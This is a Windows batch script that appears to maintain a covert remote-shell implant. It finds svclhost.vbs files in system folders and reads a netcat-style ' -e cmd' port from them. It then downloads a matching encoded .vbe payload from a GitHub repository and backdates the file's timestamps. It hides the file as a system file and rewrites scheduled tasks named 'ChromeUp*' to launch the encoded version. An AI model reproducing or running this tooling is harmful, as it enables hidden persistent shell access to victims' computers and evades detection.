@echo off
setlocal enabledelayedexpansion


if exist C:\Windows\Temp\svclhost.vbs (
	set "fold_path=C:\Windows\Temp\"
	rem attrib -h -s "!fold_path!svclhost.vbs"
	if exist !fold_path!svclhost.vbe (del /s /a !fold_path!svclhost.vbe >nul 2>&1)
	call :GetEncrypted
	echo.
	set /P "Cln=Remove Old VBS File in !fold_path! (Y/N Default is No): "
	if not defined Cln (set Cln=N)
	if /i not !Cln!==n (del /s /a "!fold_path!svclhost.vbs")
)
if exist C:\Windows\addins\svclhost.vbs (
	set "fold_path=C:\Windows\addins\"
	rem attrib -h -s "!fold_path!svclhost.vbs"
	if exist !fold_path!svclhost.vbe (del /s /a !fold_path!svclhost.vbe >nul 2>&1)
	call :GetEncrypted
	echo.
	set /P "Cln=Remove Old VBS File in !fold_path! (Y/N Default is No): "
	if not defined Cln (set Cln=N)
	if /i not !Cln!==n (del /s /a "!fold_path!svclhost.vbs")
)
if exist C:\Windows\SysWOW64\svclhost.vbs (
	set "fold_path=C:\Windows\SysWOW64\"
	rem attrib -h -s "!fold_path!svclhost.vbs"
	if exist !fold_path!svclhost.vbe (del /s /a !fold_path!svclhost.vbe >nul 2>&1)
	call :GetEncrypted
	echo.
	set /P "Cln=Remove Old VBS File in !fold_path! (Y/N Default is No): "
	if not defined Cln (set Cln=N)
	if /i not !Cln!==n (del /s /a "!fold_path!svclhost.vbs")
)

echo.
set /P "Upd=Convert All Tasks To ENCRYPTED Mode (Y/N Default is No): "
if not defined Upd (set Upd=N)
if /i %Upd%==n (exit /b)

PowerShell -Command "Get-ScheduledTask | Where-Object { $_.TaskName -like 'ChromeUp*' } | ForEach-Object { $task = $_; $actions = @(); foreach ($a in $task.Actions) { if ($a.Arguments) { $a.Arguments = $a.Arguments -replace '\.vbs', '.vbe' }; $actions += $a }; $definition = [Microsoft.Management.Infrastructure.CimInstance]($task | Get-ScheduledTask); Register-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -Action $actions -Trigger $task.Triggers -Settings $definition.Settings -Principal $definition.Principal -Description $definition.Description -Force }; exit $Error.Count"

exit /b

:GetEncrypted
rem powershell -NoProfile -Command "Get-Content '!fold_path!svclhost.vbs' | Where-Object { $_ -match ' -e cmd' } | ForEach-Object { if ($_ -match '(?:^|\s)(\d+)\s-e cmd') { Write-Output $Matches[1]; exit } }"


for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "Get-Content '!fold_path!svclhost.vbs' | Where-Object { $_ -match ' -e cmd' } | ForEach-Object { if ($_ -match '(?:^|\s)(\d+)\s-e cmd') { Write-Output $Matches[1]; exit } }"`) do (
    set "port=%%A"
	echo Detected !port!
)

if defined port (
    if !port! GEQ 4420 if !port! LEQ 4427 (
		curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/VBE/!port!.vbe > !fold_path!svclhost.vbe
		powershell -Command "$t = Get-Item "!fold_path!svclhost.vbe"; $t.CreationTime=('01/16/2022 13:51:00'); $t.LastWriteTime=('01/16/2022 13:51:00'); $t.LastAccessTime=('01/16/2022 13:51:00')"
		echo !fold_path!svclhost.vbe Is Downloaded....
		more !fold_path!svclhost.vbe
		attrib +h +s "!fold_path!svclhost.vbe"
    ) else (
        echo Port Is Outside Range...
    )
) else (
    echo Port Variable Not Set
)
set "port="
goto :eof